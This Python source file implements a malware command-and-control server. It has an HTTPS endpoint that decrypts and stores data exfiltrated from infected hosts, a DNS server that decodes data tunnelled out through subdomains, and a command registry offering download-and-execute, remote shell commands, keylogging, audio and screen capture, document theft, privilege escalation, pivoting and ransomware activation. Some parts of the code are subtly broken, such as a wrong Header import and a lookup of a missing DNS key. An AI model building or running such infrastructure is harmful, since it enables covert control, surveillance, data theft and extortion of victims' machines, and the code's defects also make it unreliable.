import asyncio
import base64
from email.header import Header
import json
import logging
import os
import re
import socket
import sqlite3
import ssl
from datetime import datetime
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from aiohttp import web
from dnslib import DNSRecord, RR, A, QTYPE
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# ====================== SERVER CONFIGURATION ======================
C2_IP = "0.0.0.0"  # Listen on all interfaces
C2_PORT = 8443
DNS_PORT = 53
ICMP_ENABLED = True
COMMAND_INTERVAL = 300  # 5 minutes

# RSA Key Generation (2048-bit)
PRIVATE_KEY = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
PUBLIC_KEY = PRIVATE_KEY.public_key()

# Convert to PEM format
PRIVATE_PEM = PRIVATE_KEY.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
PUBLIC_PEM = PUBLIC_KEY.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Database setup
DB_NAME = "c2_database.db"

# ====================== LOGGING CONFIGURATION ======================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("C2-Server")

# ====================== DATABASE MANAGEMENT ======================
class DatabaseManager:
    def __init__(self):
        self.conn = sqlite3.connect(DB_NAME)
        self._init_db()
        
    def _init_db(self):
        cursor = self.conn.cursor()
        
        # Clients table
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hostname TEXT,
            username TEXT,
            os TEXT,
            ip_address TEXT,
            first_seen TEXT,
            last_seen TEXT,
            is_admin INTEGER,
            status TEXT
        )
        ''')
        
        # Commands table
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id INTEGER,
            command_type TEXT,
            command_text TEXT,
            issued_at TEXT,
            executed_at TEXT,
            status TEXT,
            result TEXT,
            FOREIGN KEY(client_id) REFERENCES clients(id)
        )
        ''')
        
        # Exfiltrated data table
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS exfiltrated_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id INTEGER,
            data_type TEXT,
            data_content TEXT,
            received_at TEXT,
            FOREIGN KEY(client_id) REFERENCES clients(id)
        )
        ''')
        
        self.conn.commit()
        
    def register_client(self, hostname, username, os, ip_address, is_admin):
        cursor = self.conn.cursor()
        now = datetime.now().isoformat()
        
        # Check if client exists
        cursor.execute('SELECT id FROM clients WHERE hostname=? AND username=?', (hostname, username))
        client = cursor.fetchone()
        
        if client:
            # Update existing client
            cursor.execute('''
            UPDATE clients 
            SET last_seen=?, ip_address=?, is_admin=?, status='active'
            WHERE id=?
            ''', (now, ip_address, is_admin, client[0]))
        else:
            # Insert new client
            cursor.execute('''
            INSERT INTO clients 
            (hostname, username, os, ip_address, first_seen, last_seen, is_admin, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, 'active')
            ''', (hostname, username, os, ip_address, now, now, is_admin))
        
        self.conn.commit()
        return cursor.lastrowid
    
    def log_command(self, client_id, command_type, command_text):
        cursor = self.conn.cursor()
        now = datetime.now().isoformat()
        
        cursor.execute('''
        INSERT INTO commands 
        (client_id, command_type, command_text, issued_at, status)
        VALUES (?, ?, ?, ?, 'pending')
        ''', (client_id, command_type, command_text, now))
        
        self.conn.commit()
        return cursor.lastrowid
    
    def update_command_result(self, command_id, result, status="completed"):
        cursor = self.conn.cursor()
        now = datetime.now().isoformat()
        
        cursor.execute('''
        UPDATE commands 
        SET executed_at=?, status=?, result=?
        WHERE id=?
        ''', (now, status, result, command_id))
        
        self.conn.commit()
    
    def store_exfiltrated_data(self, client_id, data_type, data_content):
        cursor = self.conn.cursor()
        now = datetime.now().isoformat()
        
        cursor.execute('''
        INSERT INTO exfiltrated_data 
        (client_id, data_type, data_content, received_at)
        VALUES (?, ?, ?, ?)
        ''', (client_id, data_type, data_content, now))
        
        self.conn.commit()
    
    def get_pending_commands(self, client_id):
        cursor = self.conn.cursor()
        cursor.execute('''
        SELECT id, command_type, command_text 
        FROM commands 
        WHERE client_id=? AND status='pending'
        ''', (client_id,))
        return cursor.fetchall()
    
    def get_client_by_hostname(self, hostname):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM clients WHERE hostname=?', (hostname,))
        return cursor.fetchone()

# ====================== ENCRYPTION HANDLER ======================
class EncryptionHandler:
    def __init__(self):
        self.private_key = RSA.import_key(PRIVATE_PEM)
        
    def decrypt_data(self, encrypted_data):
        try:
            data = base64.b64decode(encrypted_data)
            enc_session_key = data[:256]
            iv = data[256:272]
            ciphertext = data[272:]
            
            # Decrypt session key
            cipher_rsa = PKCS1_OAEP.new(self.private_key)
            session_key = cipher_rsa.decrypt(enc_session_key)
            
            # Decrypt data with session key
            cipher = AES.new(session_key, AES.MODE_CFB, iv)
            decrypted = cipher.decrypt(ciphertext)
            
            try:
                return json.loads(decrypted)
            except:
                return decrypted.decode()
        except Exception as e:
            logger.error(f"Decryption failed: {str(e)}")
            return None

# ====================== COMMAND HANDLER ======================
class CommandHandler:
    def __init__(self, db_manager):
        self.db = db_manager
        self.command_registry = {
            "download_execute": self.handle_download_execute,
            "execute_command": self.handle_execute_command,
            "screenshot": self.handle_screenshot,
            "record_audio": self.handle_record_audio,
            "keylogger": self.handle_keylogger,
            "steal_documents": self.handle_steal_documents,
            "update_config": self.handle_update_config,
            "uninstall": self.handle_uninstall,
            "elevate": self.handle_elevate,
            "pivot": self.handle_pivot,
            "ransom": self.handle_ransom
        }
    
    async def handle_command(self, command_type, params, client_id):
        handler = self.command_registry.get(command_type)
        if handler:
            return await handler(params, client_id)
        return {"status": "error", "message": "Unknown command type"}
    
    async def handle_download_execute(self, params, client_id):
        url = params.get("url")
        if not url:
            return {"status": "error", "message": "Missing URL"}
        
        # In a real C2, you would validate the URL first
        return {
            "status": "success",
            "url": url,
            "message": "Command queued for execution"
        }
    
    async def handle_execute_command(self, params, client_id):
        cmd = params.get("command")
        if not cmd:
            return {"status": "error", "message": "Missing command"}
        
        # Sanitize command (very basic example)
        if "rm -rf" in cmd or "format" in cmd:
            return {"status": "error", "message": "Dangerous command blocked"}
        
        return {
            "status": "success",
            "command": cmd,
            "message": "Command queued for execution"
        }
    
    async def handle_screenshot(self, params, client_id):
        duration = params.get("duration", 60)
        return {
            "status": "success",
            "duration": duration,
            "message": "Screenshot command queued"
        }
    
    async def handle_record_audio(self, params, client_id):
        duration = params.get("duration", 120)
        return {
            "status": "success",
            "duration": duration,
            "message": "Audio recording command queued"
        }
    
    async def handle_keylogger(self, params, client_id):
        duration = params.get("duration", 300)
        return {
            "status": "success",
            "duration": duration,
            "message": "Keylogger activated"
        }
    
    async def handle_steal_documents(self, params, client_id):
        return {
            "status": "success",
            "message": "Document theft command queued"
        }
    
    async def handle_update_config(self, params, client_id):
        new_config = params.get("config", {})
        return {
            "status": "success",
            "config": new_config,
            "message": "Config update queued"
        }
    
    async def handle_uninstall(self, params, client_id):
        return {
            "status": "success",
            "message": "Uninstall command queued"
        }
    
    async def handle_elevate(self, params, client_id):
        return {
            "status": "success",
            "message": "Privilege escalation command queued"
        }
    
    async def handle_pivot(self, params, client_id):
        target = params.get("target")
        return {
            "status": "success",
            "target": target,
            "message": "Network pivot command queued"
        }
    
    async def handle_ransom(self, params, client_id):
        note = params.get("note", "Your files have been encrypted.")
        return {
            "status": "success",
            "note": note,
            "message": "Ransomware activation queued"
        }

# ====================== HTTP SERVER ======================
class C2HttpServer:
    def __init__(self, db_manager, encryption_handler, command_handler):
        self.db = db_manager
        self.encryption = encryption_handler
        self.command_handler = command_handler
        self.app = web.Application()
        self.setup_routes()
        
    def setup_routes(self):
        self.app.router.add_post('/api/v1/collect', self.handle_collect)
        self.app.router.add_get('/command', self.handle_command_request)
        self.app.router.add_post('/result', self.handle_command_result)
        self.app.router.add_get('/admin', self.admin_dashboard)
        
    async def handle_collect(self, request):
        try:
            # Get client IP
            ip = request.remote
            
            # Read encrypted data
            encrypted_data = await request.text()
            data = self.encryption.decrypt_data(encrypted_data)
            
            if not data:
                return web.Response(status=400, text="Invalid data")
            
            # Register client
            client_id = self.db.register_client(
                hostname=data.get("host", "unknown"),
                username=data.get("user", "unknown"),
                os=data.get("system_info", {}).get("os", "unknown"),
                ip_address=ip,
                is_admin=data.get("system_info", {}).get("is_admin", False)
            )
            
            # Store exfiltrated data
            for data_type, content in data.items():
                if data_type not in ["host", "user", "timestamp"]:
                    self.db.store_exfiltrated_data(client_id, data_type, str(content))
            
            return web.Response(text="Data received")
        except Exception as e:
            logger.error(f"Error in handle_collect: {str(e)}")
            return web.Response(status=500, text="Server error")
    
    async def handle_command_request(self, request):
        try:
            hostname = request.query.get("hostname")
            if not hostname:
                return web.Response(status=400, text="Hostname required")
            
            client = self.db.get_client_by_hostname(hostname)
            if not client:
                return web.Response(status=404, text="Client not found")
            
            # Get pending commands
            commands = self.db.get_pending_commands(client[0])
            if not commands:
                return web.Response(status=204)  # No content
            
            # Prepare response (only first command for simplicity)
            command = commands[0]
            response = {
                "type": command[1],
                "params": json.loads(command[2]) if command[2] else {}
            }
            
            return web.json_response(response)
        except Exception as e:
            logger.error(f"Error in handle_command_request: {str(e)}")
            return web.Response(status=500, text="Server error")
    
    async def handle_command_result(self, request):
        try:
            encrypted_data = await request.text()
            data = self.encryption.decrypt_data(encrypted_data)
            
            if not data or "command" not in data:
                return web.Response(status=400, text="Invalid data")
            
            # Update command status
            self.db.update_command_result(
                data.get("command_id"),
                json.dumps(data.get("result", {})),
                data.get("status", "completed")
            )
            
            return web.Response(text="Result received")
        except Exception as e:
            logger.error(f"Error in handle_command_result: {str(e)}")
            return web.Response(status=500, text="Server error")
    
    async def admin_dashboard(self, request):
        # Basic admin interface (would be more sophisticated in real implementation)
        html = """
        <html>
            <head>
                <title>C2 Admin Dashboard</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; }
                    table { border-collapse: collapse; width: 100%; }
                    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                    th { background-color: #f2f2f2; }
                </style>
            </head>
            <body>
                <h1>C2 Command Center</h1>
                <h2>Connected Clients</h2>
                <!-- Client list would be dynamically generated -->
                <h2>Issue Command</h2>
                <form action="/command" method="post">
                    <label for="hostname">Hostname:</label>
                    <input type="text" id="hostname" name="hostname" required><br>
                    <label for="command">Command:</label>
                    <select id="command" name="command">
                        <option value="execute_command">Execute Command</option>
                        <option value="screenshot">Take Screenshot</option>
                        <option value="keylogger">Start Keylogger</option>
                    </select><br>
                    <label for="params">Parameters (JSON):</label>
                    <input type="text" id="params" name="params"><br>
                    <input type="submit" value="Send Command">
                </form>
            </body>
        </html>
        """
        return web.Response(text=html, content_type="text/html")

# ====================== DNS SERVER ======================
class DnsServer:
    def __init__(self, db_manager, encryption_handler):
        self.db = db_manager
        self.encryption = encryption_handler
        self.dns_records = {
            'dns.testing.com': '192.168.1.22',  # Your C2 server IP
            'c2.example.com': '192.168.1.22'
        }
    
    async def start(self):
        loop = asyncio.get_event_loop()
        transport, protocol = await loop.create_datagram_endpoint(
            lambda: DnsProtocol(self),
            local_addr=('0.0.0.0', DNS_PORT)
        )
        logger.info(f"DNS server started on port {DNS_PORT}")
        return transport

class DnsProtocol:
    def __init__(self, server):
        self.server = server
    
    def connection_made(self, transport):
        self.transport = transport
    
    def datagram_received(self, data, addr):
        try:
            request = DNSRecord.parse(data)
            reply = DNSRecord(Header(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            
            qname = str(request.q.qname)
            qtype = request.q.qtype
            
            # Handle DNS tunneling data
            if qname.endswith(self.server.dns_records.keys()):
                # Extract data from subdomain
                subdomain = qname.split('.')[0]
                try:
                    # Decode base32 data
                    decoded = base64.b32decode(subdomain.upper() + '=' * ((8 - len(subdomain) % 8)))
                    logger.info(f"Received DNS data: {decoded}")
                    
                    # Process the data (would be decrypted in real scenario)
                    self.server.db.store_exfiltrated_data(0, "dns_tunnel", decoded.decode())
                except:
                    pass
                
                # Respond with our IP
                reply.add_answer(RR(qname, QTYPE.A, rdata=A(self.server.dns_records['api.example.com'])))
            else:
                # Normal DNS query
                if qtype == QTYPE.A and qname in self.server.dns_records:
                    reply.add_answer(RR(qname, QTYPE.A, rdata=A(self.server.dns_records[qname])))
            
            self.transport.sendto(reply.pack(), addr)
        except Exception as e:
            logger.error(f"DNS error: {str(e)}")

# ====================== MAIN SERVER ======================
async def start_servers():
    # Initialize components
    db_manager = DatabaseManager()
    encryption_handler = EncryptionHandler()
    command_handler = CommandHandler(db_manager)
    
    # Start HTTP server
    http_server = C2HttpServer(db_manager, encryption_handler, command_handler)
    runner = web.AppRunner(http_server.app)
    await runner.setup()
    
    # SSL context (self-signed cert for demo)
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain('server.crt', 'server.key')
    
    site = web.TCPSite(runner, C2_IP, C2_PORT, ssl_context=ssl_context)
    await site.start()
    logger.info(f"HTTP server started on https://{C2_IP}:{C2_PORT}")
    
    # Start DNS server
    dns_server = DnsServer(db_manager, encryption_handler)
    await dns_server.start()
    
    # Keep servers running
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    # Generate SSL cert if needed (for testing)
    if not os.path.exists('server.crt'):
        logger.warning("Generating self-signed SSL certificate...")
        os.system('openssl req -x509 -newkey rsa:4096 -nodes -out server.crt -keyout server.key -days 365 -subj "/CN=api.example.com"')
    
    # Start the server
    try:
        asyncio.run(start_servers())
    except KeyboardInterrupt:
        logger.info("Server stopped by user")
    except Exception as e:
        logger.error(f"Server error: {str(e)}") 